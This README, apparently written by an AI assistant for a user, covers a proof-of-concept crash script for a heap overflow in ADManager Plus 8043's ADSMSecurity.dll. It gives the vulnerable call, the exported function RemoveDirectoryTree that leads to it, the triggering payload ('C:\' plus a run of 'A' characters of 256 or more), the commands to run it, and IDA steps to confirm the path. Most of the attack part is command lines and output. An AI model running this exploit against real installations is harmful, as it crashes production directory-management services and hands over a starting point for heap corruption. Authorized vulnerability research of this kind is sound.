# F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed

## Overview
Fixed PoC for `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.

## Features

### 1. Exact Export That Is Input Reason (NEW - your request)
Shows **exact export** that is the reason of input crash, not all exports:

```bash
python f4_crash_poc.py --exact-export
python f4_crash_poc.py --exact-input
python f4_crash_poc.py --find-caller
python f4_crash_poc.py --input-export
```

Output (simulated if DLL not found, real PE parsing if DLL exists):
```
EXACT INPUT EXPORT FINDER
Target vulnerable: sub_0x7410 RVA 0x7410

EXACT EXPORT: RemoveDirectoryTree
  Ordinal: 11
  RVA: 0x2300
  Signature: int RemoveDirectoryTree(wchar_t *path)
  Calls: sub_0x7410(NULL, path) -> vulnerable
  Reason: public wrapper takes user-controlled path straight to walker without length check

SECONDARY EXACT EXPORTS:
  - SecureDelete -> calls RemoveDirectoryTree -> sub_0x7410
  - CleanTempFiles -> calls RemoveDirectoryTree
  - PurgeOldLogs -> calls RemoveDirectoryTree
  - DeleteUserData -> calls SecureDelete

VULNERABLE FUNCTION (NOT EXPORTED, CRASHES HERE):
  sub_0x7410 RVA 0x7410
  wsprintfW(malloc(0x208), "%s\*.*", path)

PAYLOAD: C:\ + 'A'* (len-3), len>=256
```

**On real DLL**, it scans `.text` for `CALL E8` to `0x7410`, finds caller RVA, maps to containing export, and prints that exact export as input reason. Works without IDA.

In IDA to confirm:
1. `G -> 0x7410` to `sub_0x7410`
2. `Ctrl+X` xrefs to it -> 1 caller inside `RemoveDirectoryTree`
3. `F5` on `RemoveDirectoryTree(path) { sub_0x7410(NULL, path); }`
4. That export is exact input reason.

### 2. Export Table (all)
```bash
python f4_crash_poc.py --exports
python f4_crash_poc.py --ida-info
```

### 3. Payload + Function Printed at Crash
```bash
python f4_crash_poc.py --len 1000
```
Prints:
```
[CRASH] PAYLOAD THAT TRIGGERED:
  Function: sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker
  Vulnerable call: wsprintfW(malloc(0x208), "%s\*.*", path)
  Payload length: 1000
  Payload preview: C:\AAAAA... [len=1000]
  Payload full: C:\AAAA...
```

### 4. Stay-Crashed Observable
```bash
python f4_crash_poc.py --stay-crashed --len 1000 --status-file ./f4_crash_state.json --indicator-file ./f4_crashed.lock --http-port 8080
curl http://localhost:8080/
cat f4_crash_state.json  # includes payload + function + export
```

### 5. Keep-Alive
```bash
python f4_crash_poc.py --control --keep-alive 10
python f4_crash_poc.py --len 1000 --keep-alive 5
```

## Fixes
- Duplicate main fixed, % escaping, POSIX truncation, cross-platform guards

## Safety
Throwaway child only, lab authorized.

## Requirements
Python 3.8+ stdlib only
